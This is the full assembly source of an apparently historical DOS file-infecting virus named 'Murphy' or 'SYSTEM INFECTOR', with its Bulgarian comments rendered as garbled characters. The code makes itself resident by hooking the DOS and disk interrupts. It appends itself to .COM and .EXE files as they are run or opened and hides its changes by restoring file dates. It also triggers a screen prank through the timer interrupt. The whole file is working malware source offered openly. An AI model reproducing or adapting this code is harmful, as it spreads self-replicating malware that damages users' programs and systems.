;
;	dynamic self loader
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;			     SYSTEM INFECTOR
;
;
;     Version 4.00 - Copywrite (c) 1989 by L.Mateew & Jany Brankow
;
;			  All rights reserved.
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

	page	,132

	title	SYSTEM INFECTOR

comp13		=	offset kt1 - offset org13
comp21		=	offset kt1 - offset new21
compbuff	=	offset kt1 - offset buffer
compbuff1	=	offset kt1 - offset buffer1
comp_code	=	offset kt1 - offset my_code
vir_length	=	offset endpr - offset entry_point
Cred		=	offset virus - offset credits


code	segment				; най - важни┐ ▒егмен▓ !!!

	assume	cs:code			; ини╢иализи░ане на CS

	org	100h			; на╖ален ад░е▒ на п░ог░ама▓а

entry_point:				; в╡одна ▓о╖ка
	jmp	point1			; ▒кок в п░ог░ама▓а за │▒▓анов┐ване на ви░│▒а

buffer	db	18h dup (0c3h)		; ╖е▓и░и по RET
buffer1 db	4 dup (0c3h)		; ▓░и по RET
my_code dw	?
time	dw	?
date	dw	?
old_len dd	?
new21	dd	?			; м┐▒▓о за нови┐ век▓о░
old24	dd	?
org13	dd	?
old13	dd	?


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;	   За незаконно копи░ане ╣е о▓иде▓е в за▓во░а !
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
credits:
	db	' It''s me - Murphy. '
	db	' Copywrite (c)1990 by Lubo &'
	db	' Ian, Sofia, USM Laboratory. '

virus	proc	near			;
	call	time_kill		; п░ове░ка за да▓а и ╖а▒
	cmp	ax,4b00h+'M'		; ДОС ┤│нк╢и┐ EXEC ?
	jnz	@05
	push	bp
	mov	bp,sp
	and	word ptr [bp+6],0fffeh
	pop	bp
	iret
@05:
	cmp	ah,4bh			; ДОС ┤│нк╢и┐ EXEC ?
	jz	p0
	cmp	ax,3d00h		; ДОС ┤│нк╢и┐ OPEN ?
	jz	p0			; да !
	cmp	ax,6c00h		; п░ове░ка за DOS Fn 6C
	jnz	@04			; има и д░│г на╖ин
	cmp	bl,0			; но░мално о▓ва░┐не
	jz	p0			; за░аз┐ване
@04:
	jmp	do_not_bite		; не - п░е╡од к║м ▒▓а░и┐ век▓о░
p0:					;
	push	es			; запазване на ES ,
	push	ds			; DS ,
	push	di			; DI ,
	push	si			; SI ,
	push	bp			; BP ,
	push	dx			; DX ,
	push	cx			; CX ,
	push	bx			; BX ,
	push	ax			; и AX
	call	ints_on
	call	ints_off
	cmp	ax,6c00h		; п░ове░ка за OPEN
	jnz	kt6			; п░е▒ка╖ане
	mov	dx,si			; без д│ми
kt6:
	mov	cx,80h			; мак▒имална д║лжина на ┤айлова▓а
	mov	si,dx			; ▒пе╢и┤ика╢и┐
while_null:				;
	inc	si			; пол│╖аване на
	mov	al,byte ptr ds:[si]	; ┤айлова▓а
	or	al,al			; ▒пе╢и┤ика╢и┐
	loopne	while_null		; к░ай на ASCIIZ ?
	sub	si,02h			; 2 ▒имвола назад
	cmp	word ptr ds:[si],'MO'	; п░ове░ка за .COM - ┤айл
	jz	@03
	cmp	word ptr ds:[si],'EX'
	jz	@06
go_away:
	jmp	@01			; жалко -> no_ill_it
@06:
	cmp	word ptr ds:[si-2],'E.' ;
	jz	go_forward		;
	jmp	short go_away
@03:
	cmp	word ptr ds:[si-2],'C.' ; о╣е ни╣о не е заг│бено...
	jnz	go_away			; .COM ┤айл
go_forward:				;
	mov	ax,3d02h		; ДОС ┤│нк╢и┐ 3d /о▓ва░┐не на ┤айл/ - ░ежим на до▒▓║п 010b - ╖е▓ене и запи▒
	call	int_21			; в░║╣а ┤айлови┐ манип│ла▓о░ в AX ако CF = 0
	jc	@01			;
	mov	bx,ax			; запазване на ┤айлови┐ манип│ла▓о░ в BX
	mov	ax,5700h		;
	call	int_21			;
	mov	cs:[time],cx		;
	mov	cs:[date],dx		;
	mov	ax,4200h		; ДОС ┤│нк╢и┐ 42
	xor	cx,cx			; н│ли░ане на CX
	xor	dx,dx			; │▒▓анов┐ване на │каза▓ел┐ в на╖ало▓о на ┤айла
	call	int_21			; INT 21
	push	cs			; │▒▓анов┐ване
	pop	ds			; DS := CS
	mov	dx,offset buffer	; из╖и▒л┐ване на ад░е▒а на buffer
	mov	si,dx
	mov	cx,0018h		; ╕е▒▓ бай▓а
	mov	ah,3fh			; ДОС ┤│нк╢и┐ 3FH /╖е▓ене о▓ ┤айл/
	call	int_21			; п░о╖и▓ане на п║░ви▓е 8 бай▓а в buffer
	jc	close_file
	cmp	word ptr ds:[si],'ZM'
	jnz	@07
	call	exe_file
	jmp	short	close_file
@07:
	call	com_file
close_file:
	jc	skip_restore_date
	mov	ax,5701h
	mov	cx,cs:[time]
	mov	dx,cs:[date]
	call	int_21
skip_restore_date:
	mov	ah,3eh			; ДОС ┤│нк╢и┐ 3E - за▓ва░┐не на ┤айл
	call	int_21			; INT 21
@01:
	call	ints_off
	pop	ax			; в║з▒▓анов┐ване на AX ,
	pop	bx			; BX ,
	pop	cx			; CX ,
	pop	dx			; DX ,
	pop	bp			; BP ,
	pop	si			; SI ,
	pop	di			; DI ,
	pop	ds			; DS ,
	pop	es			; ES
do_not_bite:
	jmp	dword ptr cs:[new21]	; п░е╡од к║м ▒▓а░и┐ век▓о░
virus	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		Subroutine for .EXE file
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

exe_file	proc	near
	mov	cx,word ptr ds:[si+16h] ; за░еждане на о▓ме▒▓ване▓о на CS б па░аг░а┤и
	add	cx,word ptr ds:[si+08h] ; ▒║би░ане на п░е┤ик▒а (в па░аг░а┤и) ▒ него
	mov	ax,10h
	mul	cx			; │множаваме ги ▒ 10h и пол│╖аваме
	add	ax,word ptr ds:[si+14h] ; аб▒ол╛▓но▓о о▓ме▒▓ване на
	adc	dx,0			; в╡одна▓а ▓о╖ка ка▓о ▒║би░аме и IP
	push	dx			; запазваме ги в ▒▓ека за по-на▓а▓║к
	push	ax
	mov	ax,4202h		; ╡ва▓ка за пол│╖аване
	xor	cx,cx
	xor	dx,dx			; на д║лжина▓а на
	call	int_21			; ┤айла в DX:AX
	cmp	dx,0
	jnz	go_out			; п░ове░ка за д║лжина▓а на
	cmp	ax,vir_length		; ┤айла ╡а░е▒ан о▓ ви░│▒а
	jnb	go_out			; ако е ве╖е ╡а░е▒ан о▓ него -
	pop	ax			; Go out !
	pop	dx
	stc
	ret
go_out:
	mov	di,ax			; запазване на AX в DI
	mov	bp,dx			; и DX в BP
	pop	cx			; изваждаме о▓ме▒▓ване▓о на
	sub	ax,cx			; в╡одна▓а ▓о╖ка о▓ д║лжина▓а на ┤айла
	pop	cx			; и пол│╖аваме д║лжина▓а на
	sbb	dx,cx			; п░ог░ама▓а ▒лед в╡одна▓а ▓о╖ка
	cmp	word ptr ds:[si+0ch],00h; п░ове░ка за оп╢и┐
	je	exitp			; /HIGH
	cmp	dx,0			; ▒░авн┐ваме ги ▒ д║лжина▓а на ви░│▒а
	jne	ill_it			; и ако на ▒а ░авни лепваме го ▓ам и
	cmp	ax,vir_length		; ▓.н. . . .
	jne	ill_it
	stc
	ret
ill_it:
	mov	dx,bp			; п░о╖и▓аме д║лжина▓а на
	mov	ax,di			; на п░ог░ама▓а
	push	dx			; push ваме ги
	push	ax			; за по-на▓а▓║к
	add	ax,vir_length		; ▒║би░аме ┐ ▒
	adc	dx,0			; д║лжина▓а на Murphy
	mov	cx,512			; делим ┐ на 512 бай▓а
	div	cx
	les	di,dword ptr ds:[si+02h]; за░еждане на ▒▓а░а▓а д║лжина
	mov	word ptr cs:[old_len],di; запазване в ▓┐ло▓о
	mov	word ptr cs:[old_len+2],es;запазване в ▓┐ло▓о
	mov	word ptr ds:[si+02h],dx ; и ┐ запи▒ваме
	cmp	dx,0
	jz	skip_increment
	inc	ax
skip_increment:
	mov	word ptr ds:[si+04h],ax ; в б│┤е░а
	pop	ax			; ╖е▓ем д║лжина▓а на ┤айла
	pop	dx			; о▓ ▒▓ека
	call	div10h			; делим ┐ на 10h и ┐ пол│╖аваме в AX:DX
	sub	ax,word ptr ds:[si+08h] ; изваждаме п░е┤ик▒а
	les	di,dword ptr ds:[si+14h]; п░о╖и▓ане на ▒▓а░и▓е
	mov	word ptr ds:[buffer1],di; CS:IP и запи▒
	mov	word ptr ds:[buffer1+02h],es ; в ▓┐ло▓о
	mov	word ptr ds:[si+14h],dx ; запи▒ на нови┐ IP в б│┤е░а
	mov	word ptr ds:[si+16h],ax ; запи▒ на нови┐ CS в б│┤е░а
	mov	word ptr ds:[my_code],ax; запи▒ на нови┐ CS в║в ▓┐ло▓о
	mov	ax,4202h
	xor	cx,cx
	xor	dx,dx
	call	int_21
	call	paste
	jc	exitp
	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
	call	int_21
	mov	ah,40h
	mov	dx,si
	mov	cx,18h
	call	int_21
exitp:
	ret

exe_file	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		  Subroutine for dividing
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
div10h	proc	near
	mov	cx,04h
	mov	di,ax
	and	di,000fh
dividing:
	shr	dx,1
	rcr	ax,1
	loop	dividing
	mov	dx,di
	ret
div10h	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		Subroutine for virus moving
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

paste	proc	near
	mov	ah,40h			; ДОС ┤│нк╢и┐ 40h /запи▒ в║в ┤айл или │▒▓░ой▒▓во/
	mov	cx,vir_length		; из╖и▒л┐ване д║лжина▓а на ви░│▒а
	mov	dx,offset entry_point	; DS:DX ▓░┐бва да ▒о╖а▓ ад░е▒а на запи▒а
	call	ints_on			; заобикал┐не на ╖а▒овника (R/W)
	jmp	int_21			; запи▒ в║в ┤айла
paste	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		Subroutine for .COM file
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

com_file      proc    near

	mov	ax,4202h		; ДОС ┤│нк╢и┐ 42 /п░еме▒▓ване на ▓ек│╣и┐ │каза▓ел в║в ┤аила /AL=2 - в к░а┐/
	xor	cx,cx			; │▒▓анов┐ване на ░еги▒▓░и▓е
	xor	dx,dx			; CX и DX /ако CX:DX = 0 , в DX:AX ▒е пол│╖ава д║лжина▓а на ┤айла/
	call	int_21			; │▒▓анов┐ване в к░а┐ на ┤айла
	cmp	ax,vir_length		; ▒░авн┐ване на д║лжина▓а на ви░│▒а
	jb	short no_ill_it		; ▒ п░ог░ама▓а и п░е╡од в к░а┐ ако
	cmp	ax,64000		; д║лжина▓а на п░ог░ама▓а е < д║лж. на
	jnb	short no_ill_it		; ви░│▒а или > 0ffff-д║лж. на ви░│▒а - 20h
	push	ax			; ▒║╡░ан┐ване на AX
	cmp	byte ptr ds:[si],0E9h	; п░ове░ка за JMP в на╖ало▓о на п░ог░ама▓а
	jnz	illing			; Не? -  Ме░▒и! Тогава за░аз┐ваме.
	sub	ax,vir_length + 3	; пол│╖аване на д║лжина▓а на п░ог░ама▓а без ви░│▒а /евен▓│ално/
	cmp	ax,ds:[si+1]		; п░ове░ка за п░ог░ама▓а залепена в к░а┐
	jnz	illing			; Не? ...
	pop	ax			; о▒вобождаване на ▒▓ека
	stc
	ret
illing:
	call	paste
	jnc	skip_paste
	pop	ax
	ret
skip_paste:
	mov	ax,4200h		; ДОС ┤│нк╢и┐ 42
	xor	cx,cx			; н│ли░ане на CX
	xor	dx,dx			; │▒▓анов┐ване на │каза▓ел┐ в на╖ало▓о на ┤айла
	call	int_21			; изп║лнение на ┤│нк╢и┐▓а
	pop	ax			; ╖е▓ене на AX
	sub	ax,03h			; из╖и▒л┐ване на опе░анда на JMP-а
	mov	dx,offset buffer1	; задаване на ад░е▒а на запи▒а в DS:DX
	mov	si,dx
	mov	byte ptr cs:[si],0e9h	; запи▒ на 09H (JMP) в на╖ало▓о на ┤айла
	mov	word ptr cs:[si+1],ax	; опе░анда на JMP-а в поле▓о за запи▒
	mov	ah,40h			; ДОС ┤│нк╢и┐ 40h /запи▒ в║в ┤айл или │▒▓░ой▒▓во/
	mov	cx,3			; запи▒ ▒амо на 3 бай▓а
	call	int_21			; изп║лнение на ┤│нк╢и┐▓а
no_ill_it:
	ret

com_file      endp



;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		Subroutine for calling of an 'int 21h'
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

int_21	proc	near
	pushf
	call	dword ptr [new21]
	ret
int_21	endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;	   This subroutine changes the int 24h vector to me
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
ints_on        proc    near
	push	ax
	push	ds
	push	es
	xor	ax,ax
	push	ax
	pop	ds
	cli
	les	ax,dword ptr ds:[24h*4]
	mov	word ptr cs:[old24],ax
	mov	word ptr cs:[old24+2],es
	mov	ax,offset int_24
	mov	word ptr ds:[24h*4],ax
	mov	word ptr ds:[24h*4+2],cs
	les	ax,dword ptr ds:[13h*4]
	mov	word ptr cs:[old13],ax
	mov	word ptr cs:[old13+2],es
	les	ax,dword ptr cs:[org13]
	mov	word ptr ds:[13h*4],ax
	mov	word ptr ds:[13h*4+2],es
	sti
	pop	es
	pop	ds
	pop	ax
	ret
ints_on        endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;	      This subroutine restores the int 24h vector
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
ints_off	proc  near
	push	ax
	push	ds
	push	es
	xor	ax,ax
	push	ax
	pop	ds
	cli
	les	ax,dword ptr cs:[old24]
	mov	word ptr ds:[24h*4],ax
	mov	word ptr ds:[24h*4+2],es
	les	ax,dword ptr cs:[old13]
	mov	word ptr ds:[13h*4],ax
	mov	word ptr ds:[13h*4+2],es
	sti
	pop	es
	pop	ds
	pop	ax
	ret
ints_off	endp

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		This subroutine works the int 24h
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
int_24	proc	far
	mov	al,3
	iret
int_24	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		  Май▓ап ▒ безза╣и▓ни▓е ╡о░и╢а
;
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

joke	proc	far
	push	ax			; запазване
	push	bx
	push	cx			; на
	push	dx
	push	si
	push	di
	push	bp
	push	ds			; ░еги▒▓░и▓е
	push	es
	xor	ax,ax
	push	ax
	pop	ds
	mov	bh,ds:[462h]
	mov	ax,ds:[450h]
	mov	cs:[old_pos],ax
	mov	ax,cs:[pos_value]
	mov	word ptr ds:[450h],ax
	mov	ax,word ptr cs:[spot_buff]
	mov	bl,ah
	mov	ah,09h
	mov	cx,1
	int	10h
	call	change_pos
	call	push_spot
	mov	ax,cs:pos_value
	mov	word ptr ds:[450h],ax
	mov	bl,07h
	mov	ax,0907h
	mov	cx,1
	int	10h
	mov	ax,cs:[old_pos]
	mov	ds:[450h],ax
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	jmp	dword ptr cs:[old_1ch]


spot_buff	dw	?
pos_value	dw	1010h
direction	db	0
old_1ch		dd	?
old_pos		dw	?

change_pos	proc	near
	mov	ax,cs:[pos_value]
	mov	bx,word ptr ds:[44ah]
	dec	bx
	test	cs:[direction],00000001b
	jz	@001
	cmp	al,bl
	jb	@002
	xor	cs:[direction],00000001b
	jmp	short @002
@001:
	cmp	al,0
	jg	@002
	xor	cs:[direction],00000001b
@002:
	test	cs:[direction],00000010b
	jz	@003
	cmp	ah,24
	jb	@005
	xor	cs:[direction],00000010b
	jmp	short @005
@003:
	cmp	ah,0
	jg	@005
	xor	cs:[direction],00000010b
@005:
	cmp	byte ptr cs:spot_buff,20h
	je	skip_let
	cmp	byte ptr cs:[pos_value+1],0
	je	skip_let
	xor	cs:[direction],00000010b
skip_let:
	test	cs:[direction],00000001b
	jz	@006
	inc	byte ptr cs:[pos_value]
	jmp	short @007
@006:
	dec	byte ptr cs:[pos_value]
@007:
	test	cs:[direction],00000010b
	jz	@008
	inc	byte ptr cs:[pos_value+1]
	jmp	short @009
@008:
	dec	byte ptr cs:[pos_value+1]
@009:
	ret
change_pos	endp

push_spot	proc	near
	mov	ax,cs:[pos_value]
	mov	word ptr ds:[450h],ax
	mov	bh,ds:[462h]
	mov	ah,08h
	int	10h
	mov	word ptr cs:[spot_buff],ax
	ret
push_spot	endp
joke	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		Subroutine for check current time
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

time_kill	proc	near		;
	push	ax			; запазване
	push	bx
	push	cx			; на
	push	dx
	push	si
	push	di
	push	bp
	push	ds			; ░еги▒▓░и▓е
	push	es
	xor	ax,ax			; пол│╖аване на
	push	ax
	pop	ds
	cmp	word ptr ds:[1Ch*4],offset joke
	je	next_way
	mov	ax,ds:[46ch]
	mov	dx,ds:[46ch+2]
	mov	cx,0ffffh
	div	cx
	cmp	ax,10
	jne	next_way
	cli
	mov	bp,word ptr ds:[450h]
	call	push_spot
	mov	ds:[450h],bp
	les	ax,ds:[1ch*4]
	mov	word ptr cs:[old_1ch],ax
	mov	word ptr cs:[old_1ch+2],es
	mov	word ptr ds:[1Ch*4],offset joke
	mov	word ptr ds:[1Ch*4+2],cs
	sti
next_way:
	pop	es
	pop	ds
	pop	bp
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret
time_kill	endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		Subroutine for multiplication
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

sub_10		proc	near
		mov	dx,10h
		mul	dx				; dx:ax = reg * ax
		ret
sub_10		endp


;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;
;		     ? ? ? ? ? ? ? ?
;
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
zero_regs	proc	near

	xor	ax,ax
	xor	bx,bx
	xor	cx,cx
	xor	dx,dx
	xor	si,si
	xor	di,di
	xor	bp,bp
	ret

zero_regs	endp


point1:					;
	push	ds
	call	kt1			; ▓░ик за
kt1:					; из╖и▒л┐ване на о▓ме▒▓ване▓о
	mov	ax,4b00h + 'M'		; на kt1
	int	21h
	jc	stay
	jmp	go_to_program		;
stay:					;
	pop	si			;
	push	si			;
	mov	di,si			;
	xor	ax,ax			; Zero register
	push	ax			;
	pop	ds			;
	les	ax,ds:[13h*4]		; (0000:004C=6E5h) Load 32 bit ptr
	mov	cs:[si-comp13],ax	; (64BB:06F4=9090h)
	mov	cs:[si-comp13+2],es	; (64BB:06F6=9090h)
	les	bx,ds:[21h*4]
	mov	word ptr cs:[di-comp21],bx     ; о▓ме▒▓ване
	mov	word ptr cs:[di-comp21+2],es   ; ▒егмен▓
	mov	ax,ds:[102h]		; (0000:0102=0F000h)
	cmp	ax,0F000h
	jne	loc_14			; Jump if not equal
	mov	dl,80h
	mov	ax,ds:[106h]		; (0000:0106=0C800h)
	cmp	ax,0F000h
	je	loc_7			; Jump if equal
	cmp	ah,0C8h
	jb	loc_14			; Jump if below
	cmp	ah,0F4h
	jae	loc_14			; Jump if above or =
	test	al,7Fh			; ''
	jnz	loc_14			; Jump if not zero
	mov	ds,ax
	cmp	word ptr ds:[0],0AA55h	; (C800:0000=0AA55h)
	jne	loc_14			; Jump if not equal
	mov	dl,ds:[02h]		; (C800:0002=10h)
loc_7:
	mov	ds,ax
	xor	dh,dh			; Zero register
	mov	cl,9
	shl	dx,cl			; Shift w/zeros fill
	mov	cx,dx
	xor	si,si			; Zero register

locloop_8:
	lodsw				; String [si] to ax
	cmp	ax,0FA80h
	jne	loc_9			; Jump if not equal
	lodsw				; String [si] to ax
	cmp	ax,7380h
	je	loc_10			; Jump if equal
	jnz	loc_11			; Jump if not zero
loc_9:
	cmp	ax,0C2F6h
	jne	loc_12			; Jump if not equal
	lodsw				; String [si] to ax
	cmp	ax,7580h
	jne	loc_11			; Jump if not equal
loc_10:
	inc	si
	lodsw				; String [si] to ax
	cmp	ax,40CDh
	je	loc_13			; Jump if equal
	sub	si,3
loc_11:
	dec	si
	dec	si
loc_12:
	dec	si
	loop	locloop_8		; Loop if cx > 0
	jmp	short loc_14
loc_13:
	sub	si,7
	mov	cs:[di-comp13],si	; (64BB:06F4=9090h)
	mov	cs:[di-comp13+2],ds	; (64BB:06F6=9090h)
loc_14:
	mov	ah,62h
	int	21h
	mov	es,bx
	mov	ah,49h				; 'I'
	int	21h				; DOS Services	ah=function 49h,
						;  release memory block, es=seg
	mov	bx,0FFFFh
	mov	ah,48h				; 'H'
	int	21h				; DOS Services	ah=function 48h,
						;  allocate memory, bx=bytes/16
	sub	bx,vir_length/10h+2
	jc	go_to_program			; Jump if carry Set
	mov	cx,es
	stc					; Set carry flag
	adc	cx,bx
	mov	ah,4Ah				; 'J'
	int	21h				; DOS Services	ah=function 4Ah,
						;  change mem allocation, bx=siz
	mov	bx,vir_length/10h+1
	stc					; Set carry flag
	sbb	es:[02h],bx			; (FF95:0002=0B8CFh)
	push	es
	mov	es,cx
	mov	ah,4Ah				; 'J'
	int	21h				; DOS Services	ah=function 4Ah,
						;  change mem allocation, bx=siz
	mov	ax,es
	dec	ax
	mov	ds,ax
	mov	word ptr ds:[01h],08h		; (FEAD:0001=1906h)
	call	sub_10
	mov	bx,ax
	mov	cx,dx
	pop	ds
	mov	ax,ds
	call	sub_10
	add	ax,ds:[06h]			; (FF95:0006=0C08Eh)
	adc	dx,0
	sub	ax,bx
	sbb	dx,cx
	jc	allright			; Jump if carry Set
	sub	ds:[06h],ax			; (FF95:0006=0C08Eh)
allright:
	mov	si,di			;
	xor	di,di			; о▓ме▒▓ване ▒п░┐мо ▒егмен▓а
	push	cs			; │▒▓анов┐ване на
	pop	ds			; ░еги▒▓░и▓е
	sub	si,offset kt1 - offset entry_point   ; DS:SI
	mov	cx,vir_length		; из╖и▒л┐ване ░азме░а
	inc	cx			; на ви░│▒а
	rep	movsb			; п░е╡в║░л┐не на ви░│▒а
	mov	ah,62h
	int	21h
	dec	bx
	mov	ds,bx
	mov	byte ptr ds:[0],5ah
	mov	dx,offset virus		; DX - о▓ме▒▓ване на нови┐ век▓о░
	xor	ax,ax
	push	ax
	pop	ds
	mov	ax,es
	sub	ax,10h
	mov	es,ax
	cli
	mov	ds:[21h*4],dx
	mov	ds:[21h*4+2],es
	sti
	dec	byte ptr ds:[47bh]
go_to_program:				;
	pop	si			; за░еждане на SI о▓ ▒▓ека
	cmp	word ptr cs:[si-compbuff],'ZM'
	jnz	com_ret


exe_ret proc	far

	pop	ds
	mov	ax,word ptr cs:[si-comp_code]
	mov	bx,word ptr cs:[si-compbuff1+2]
	push	cs
	pop	cx
	sub	cx,ax
	add	cx,bx
	push	cx
	push	word ptr cs:[si-compbuff1]
	push	ds
	pop	es
	call	zero_regs		; н│ли░ане на ░еги▒▓░и▓е
	ret

exe_ret endp


com_ret:
	pop	ax
	mov	ax,cs:[si-compbuff]	;
	mov	cs:[100h],ax		; в║з▒▓анов┐ване
	mov	ax,cs:[si-compbuff+2]	; о░игинални▓е
	mov	cs:[102h],ax		; ин▒▓░│к╢ии
	mov	ax,100h			; пого▓овка на ад░е▒ CS:100
	push	ax			; ад░е▒ на в░║╣ане cs:ax
	push	cs			; в║з▒▓анов┐ване на
	pop	ds			; DS
	push	ds			; и
	pop	es			; ES
	call	zero_regs		; н│ли░ане на ░еги▒▓░и▓е
	ret				; п░е╡од в на╖ало▓о на п░ог░ама▓а
endpr:					; к░ай на п░о╢ед│░а▓а

code	ends				; к░ай на п░ог░ама▓а
	end	entry_point		; в╡одна ▓о╖ка п░и ▒▓а░▓и░ане

